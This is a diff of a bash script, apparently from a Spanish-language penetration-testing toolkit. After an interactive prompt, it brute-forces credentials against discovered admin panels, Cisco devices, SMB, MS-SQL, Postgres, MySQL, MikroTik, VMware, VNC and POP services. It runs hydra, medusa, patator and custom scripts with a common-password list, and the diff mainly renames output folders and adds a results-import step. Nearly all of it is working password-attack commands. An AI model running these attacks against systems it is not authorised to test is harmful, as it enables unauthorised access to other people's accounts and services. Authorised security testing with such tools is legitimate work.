@@ -61,8 +61,8 @@ exit
 fi
 ######################
 
-rm enumeration/* 2>/dev/null
-rm vulnerabilities/* 2>/dev/null
+rm enumeracion/* 2>/dev/null
+rm vulnerabilidades/* 2>/dev/null
 
 if [ $DICTIONARY = NULL ] ; then
 
@@ -78,9 +78,14 @@ echo "postgres" >> top.txt
 echo "mysql" >> top.txt	
 echo "cisco" >> top.txt	
 
+function insert_data () {
+	find vulnerabilidades -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files	
+	insert-data.py	
+	mv vulnerabilidades/* .vulnerabilidades2 2>/dev/null		 	
+	}
+	
 
-
-if [ -f .services/admin-web.txt ]
+if [ -f .servicios/admin-web.txt ]
 then
 
 	echo -e "\n\t $OKBLUE Encontre paneles de administracion web activos. Realizar ataque de passwords ? s/n $RESET"	  
@@ -91,7 +96,7 @@ then
       	  
 		echo -e "$OKBLUE\n\t#################### Testing pass web admin ######################$RESET"	
 			
-		for line in $(cat .services/admin-web.txt); do
+		for line in $(cat .servicios/admin-web.txt); do
 			echo -e "\n\t########### $line #######"
 			ip_port=`echo $line | cut -d "/" -f 3`
 			path=`echo $line | cut -d "/" -f 4`		
@@ -101,14 +106,14 @@ then
 			result=`webData.pl -t $ip -d "/$path/" -p $port -e todo -l web.html`	
 			if [[ $result = *"phpmyadmin"* ]]; then
 				echo -e "\t[+] phpMyAdmin identificado"
-				passWeb.pl -t $ip -p $port -m phpmyadmin -d "/$path/" -u root -f top.txt > vulnerabilities/$ip-$port-$path.txt			
+				passWeb.pl -t $ip -p $port -m phpmyadmin -d "/$path/" -u root -f top.txt > vulnerabilidades/$ip-$port-$path.txt			
 			fi		
 		done		
-		
+		insert_data
 	 fi	
 fi
 
-if [ -f .services/cisco.txt ]
+if [ -f .servicios/cisco.txt ]
 then
 
 	echo -e "\n\t $OKBLUE Encontre dispositivos CISCO activos. Realizar ataque de passwords ? s/n $RESET"	  
@@ -118,16 +123,17 @@ then
 		then       	 
       	  
 		echo -e "$OKBLUE\n\t#################### Testing pass CISCO ######################$RESET"	
-		for ip in $(cat .services/cisco.txt); do
+		for ip in $(cat .servicios/cisco.txt); do
 			echo -e "\n\t########### $ip #######"			
 			patator http_fuzz method=GET url="http://$ip/" user_pass=cisco:FILE0 0=top.txt -e user_pass:b64 --threads=1 2> logs/cracking/$ip-80-ciscoPassword.txt
-			grep --color=never '200 OK' logs/cracking/$ip-80-ciscoPassword.txt > vulnerabilities/$ip-80-ciscoPassword.txt
+			grep --color=never '200 OK' logs/cracking/$ip-80-ciscoPassword.txt > vulnerabilidades/$ip-80-ciscoPassword.txt
 			echo ""			
 		done
+		insert_data
 	 fi	
 fi
 
-if [ -f .services/Windows.txt ]
+if [ -f .servicios/Windows.txt ]
 then
 	echo -e "\n\t $OKBLUE Encontre servicios SMB activos (Windows). Realizar ataque de passwords ? s/n $RESET"	  
 	read bruteforce	  
@@ -136,7 +142,7 @@ then
       then 
 
 	 echo -e "$OKBLUE\n\t#################### Windows auth ######################$RESET"	    
-	 for ip in $(cat .services/Windows.txt); do		
+	 for ip in $(cat .servicios/Windows.txt); do		
 		echo -e "\n\t########### $ip #######"	
 		hostlive=`nmap -n -Pn -p 445 $ip`
 		if [[ ${hostlive} == *"open"*  ]];then 
@@ -146,23 +152,21 @@ then
 			hydra -l soporte -P top.txt -t 1 $ip smb | tee -a  logs/cracking/$ip-windows.txt 2>/dev/null
 			hydra -l sistemas -P top.txt -t 1 $ip smb | tee -a  logs/cracking/$ip-windows.txt 2>/dev/null
 			hydra -l $entidad -P top.txt -t 1 $ip smb | tee -a  logs/cracking/$ip-windows.txt 2>/dev/null		
-			egrep --color=never 'password:|login:' logs/cracking/$ip-windows.txt > vulnerabilities/$ip-windows-password.txt
+			egrep --color=never 'password:|login:' logs/cracking/$ip-windows.txt > vulnerabilidades/$ip-windows-password.txt
 			
 			#https://github.com/m4ll0k/SMBrute (shared)
 		
 		else
 			echo "Equipo apagado"
-		fi
-								
-		
-		
+		fi									
 	 done	
-   fi # if bruteforce
+	 insert_data
+   fi # if bruteforce   
 fi
 
 
 
-if [ -f .services/ZKSoftware.txt ]
+if [ -f .servicios/ZKSoftware.txt ]
 then
 
 	echo -e "\n\t $OKBLUE Encontre servicios de ZKSoftware activos. Realizar ataque de passwords ? s/n $RESET"	  
@@ -172,16 +176,17 @@ then
 		then       	 
       	  
 		echo -e "$OKBLUE\n\t#################### Testing pass ZKSoftware ######################$RESET"	
-		for ip in $(cat .services/ZKSoftware.txt); do
+		for ip in $(cat .servicios/ZKSoftware.txt); do
 			echo -e "\n\t########### $ip #######"			
-			passWeb.pl -t $ip -p 80 -m ZKSoftware -u administrator -f top.txt > vulnerabilities/$ip-80-password.txt
+			passWeb.pl -t $ip -p 80 -m ZKSoftware -u administrator -f top.txt > vulnerabilidades/$ip-80-password.txt
 			echo ""			
 		done
+		insert_data
 	 fi	
 fi
 
 
-if [ -f .services/mssql.txt ]
+if [ -f .servicios/mssql.txt ]
 then
 	echo -e "\n\t $OKBLUE Encontre servicios MS-SQL activos. Realizar ataque de passwords ? s/n $RESET"	  
 	read bruteforce	  
@@ -190,7 +195,7 @@ then
       then 
 
 	 echo -e "$OKBLUE\n\t#################### MS-SQL ######################$RESET"	    
-	 for line in $(cat .services/mssql.txt); do
+	 for line in $(cat .servicios/mssql.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		
@@ -199,14 +204,15 @@ then
 		medusa -e n -u adm -P top.txt -h $ip -M mssql | tee -a  logs/cracking/$ip-mssql.txt
 		medusa -e n -u $entidad -P top.txt -h $ip -M mssql | tee -a  logs/cracking/$ip-mssql.txt
 		
-		grep --color=never SUCCESS logs/cracking/$ip-mssql.txt > vulnerabilities/$ip-mssql-password.txt
+		grep --color=never SUCCESS logs/cracking/$ip-mssql.txt > vulnerabilidades/$ip-mssql-password.txt
 		
 	 done	
+	 insert_data
    fi # if bruteforce
 fi
 
 
-if [ -f .services/postgres.txt ]
+if [ -f .servicios/postgres.txt ]
 then
 	echo -e "\n\t $OKBLUE Encontre servicios postgres activos. Realizar ataque de passwords ? s/n $RESET"	  
 	read bruteforce	  
@@ -215,22 +221,24 @@ then
       then 
 
 	 echo -e "$OKBLUE\n\t#################### postgres ######################$RESET"	    
-	 for line in $(cat .services/postgres.txt); do
+	 for line in $(cat .servicios/postgres.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		
 		echo -e "\n\t########### $ip #######"							
 		medusa -e n -u postgres -P top.txt -h $ip -M postgres | tee -a  logs/cracking/$ip-postgres.txt
+		medusa -e n -u pgsql -P top.txt -h $ip -M postgres | tee -a  logs/cracking/$ip-postgres.txt
 		medusa -e n -u $entidad -P top.txt -h $ip -M postgres | tee -a  logs/cracking/$ip-postgres.txt
 		
-		grep --color=never SUCCESS logs/cracking/$ip-postgres.txt > vulnerabilities/$ip-postgres-password.txt
+		grep --color=never SUCCESS logs/cracking/$ip-postgres.txt > vulnerabilidades/$ip-postgres-password.txt
 		
 	 done	
+	 insert_data
    fi # if bruteforce
 fi
 
 
-if [ -f .services/MikroTik.txt ]
+if [ -f .servicios/MikroTik.txt ]
 then
 	echo -e "\n\t $OKBLUE Encontre dispositivos MikroTik. Realizar ataque de passwords ? s/n $RESET"	  
 	read bruteforce	  
@@ -238,7 +246,7 @@ then
 	if [ $bruteforce == 's' ]
     then      	  
 	  echo -e "$OKBLUE\n\t#################### Testing common pass MikroTik ######################$RESET"	
-	  for ip in $(cat .services/MikroTik.txt); do		
+	  for ip in $(cat .servicios/MikroTik.txt); do		
 		echo -e "\n\t########### $ip #######"			
 				
 		mkbrutus.py -t $ip -u admin -d top.txt | tee -a  logs/cracking/$ip-MikroTik.txt
@@ -246,10 +254,11 @@ then
 		
 		echo ""			
 	 done
+	 insert_data
 	fi # if bruteforce
 fi
 
-if [ -f .services/vmware.txt ]
+if [ -f .servicios/vmware.txt ]
 then
 	echo -e "\n\t $OKBLUE Encontre servicios de vmware activos. Realizar ataque de passwords ? s/n $RESET"	  
 	read bruteforce	  
@@ -257,19 +266,20 @@ then
 	if [ $bruteforce == 's' ]
     then      	  
 	  echo -e "$OKBLUE\n\t#################### Testing common pass vmware ######################$RESET"	
-	  for line in $(cat .services/vmware.txt); do
+	  for line in $(cat .servicios/vmware.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		echo -e "\n\t########### $ip #######"			
 		medusa -e n -u root -P top.txt -h $ip -M vmauthd | tee -a  logs/cracking/$ip-vmware.txt	
 		medusa -e n -u $entidad  -P top.txt -h $ip -M vmauthd | tee -a  logs/cracking/$ip-vmware.txt
-		grep --color=never SUCCESS logs/cracking/$ip-vmware.txt > vulnerabilities/$ip-vmware-password.txt
+		grep --color=never SUCCESS logs/cracking/$ip-vmware.txt > vulnerabilidades/$ip-vmware-password.txt
 		echo ""			
 	 done
+	 insert_data
 	fi # if bruteforce
 fi
 
-if [ -f .services/mysql.txt ]
+if [ -f .servicios/mysql.txt ]
 then
 	echo -e "\n\t $OKBLUE Encontre servicios de MySQL activos. Realizar ataque de passwords ? s/n $RESET"	  
 	read bruteforce	  
@@ -277,7 +287,7 @@ then
 	if [ $bruteforce == 's' ]
     then        	
 		echo -e "$OKBLUE\n\t#################### Testing common pass MYSQL (lennnto) ######################$RESET"	
-		for line in $(cat .services/mysql.txt); do
+		for line in $(cat .servicios/mysql.txt); do
 			ip=`echo $line | cut -f1 -d":"`
 			port=`echo $line | cut -f2 -d":"`
 			echo -e "\n\t########### $ip #######"			
@@ -286,20 +296,21 @@ then
 				medusa -e n -u root -P top.txt -h $ip -M mysql | tee -a  logs/cracking/$ip-mysql.txt 2>> logs/cracking/$ip-mysql.txt
 				medusa -e n -u mysql -P top.txt -h $ip -M mysql | tee -a  logs/cracking/$ip-mysql.txt
 				medusa -e n -u $entidad  -P top.txt -h $ip -M mysql | tee -a  logs/cracking/$ip-mysql.txt
-				grep --color=never SUCCESS logs/cracking/$ip-mysql.txt > vulnerabilities/$ip-mysql-password.txt
+				grep --color=never SUCCESS logs/cracking/$ip-mysql.txt > vulnerabilidades/$ip-mysql-password.txt
 				echo ""			
 			else
 				echo "Host apagado"
 			fi
 			
 			
-		done		
+		done
+		insert_data		
 	fi # if bruteforce
 fi
 
 
 
-if [ -f .services/vnc.txt ]
+if [ -f .servicios/vnc.txt ]
 then
 	echo -e "\n\t $OKBLUE Encontre servicios de VNC activos. Realizar ataque de passwords ? s/n $RESET"	  
 	read bruteforce	  
@@ -307,7 +318,7 @@ then
 	if [ $bruteforce == 's' ]
     then      	  
 	  echo -e "$OKBLUE\n\t#################### Testing common pass VNC (lennnto) ######################$RESET"	
-	  for line in $(cat .services/vnc.txt); do
+	  for line in $(cat .servicios/vnc.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		echo -e "\n\t########### $ip #######"					
@@ -338,23 +349,22 @@ then
 	  done
 	
 	  echo -e "\n\t########### Checking success #######"	
-	  for line in $(cat .services/vnc.txt); do
+	  for line in $(cat .servicios/vnc.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 						
-		grep --color=never "administrador" logs/cracking/$ip-vnc-password.txt > vulnerabilities/$ip-vnc-password.txt
+		grep --color=never "administrador" logs/cracking/$ip-vnc-password.txt > vulnerabilidades/$ip-vnc-password.txt
 		echo ""			
 	  done
 	 
-	 
-	 
-	 
+	 	 
+	 insert_data
 	fi # if bruteforce
 fi
 
 
 
-if [ -f .services/pop.txt ]
+if [ -f .servicios/pop.txt ]
 then
 	echo -e "\n\t $OKBLUE Encontre servicios de POP activos. Realizar ataque de passwords ? s/n $RESET"	  
 	read bruteforce	  
@@ -365,7 +375,7 @@ then
 	  read users_file  	  
 	  
 	  echo -e "$OKBLUE\n\t#################### Testing common pass POP (lennnto) ######################$RESET"	
-	  for line in $(cat .services/pop.txt); do
+	  for line in $(cat .servicios/pop.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		echo -e "\n\t########### $ip #######"	
@@ -376,17 +386,17 @@ then
 			cat passwords2.txt top.txt | sort | uniq > passwords.txt
 			rm passwords2.txt
 			patator.py pop_login host=$ip user=$username password=FILE0 0=passwords.txt | tee -a logs/cracking/$ip-pop.txt	
-			#grep --color=never SUCCESS logs/cracking/$ip-pop.txt > vulnerabilities/$ip-pop-password.txt
+			#grep --color=never SUCCESS logs/cracking/$ip-pop.txt > vulnerabilidades/$ip-pop-password.txt
 			echo ""			
 		done			
 		
 		echo ""			
 	 done
+	 insert_data
 	fi # if bruteforce
 fi
 	
 
-insert-data.py
 
 
 
